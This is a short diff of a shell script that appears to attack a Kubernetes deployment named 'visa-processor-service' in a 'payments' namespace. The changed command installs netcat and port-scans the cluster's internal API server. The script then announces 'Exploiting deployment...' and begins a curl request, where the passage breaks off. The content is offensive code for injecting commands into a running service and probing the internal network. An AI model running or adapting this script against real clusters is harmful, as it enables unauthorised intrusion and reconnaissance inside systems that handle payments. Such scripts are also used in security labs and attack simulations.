@@ -4,7 +4,7 @@ set -eu
 export namespace='payments'
 export svc='visa-processor-service'
 export port='8080'
-export command='apt update; /usr/bin/apt-get -y install netcat; /bin/nc -h'
+export command='apt update; /usr/bin/apt-get -y install netcat; echo "Running Portscan"; nc -zvn $(getent hosts kubernetes.default.svc| cut -f 1 -d" ")  443'
 
 echo "Exploiting deployment..."
 curl -i -v -s -k \
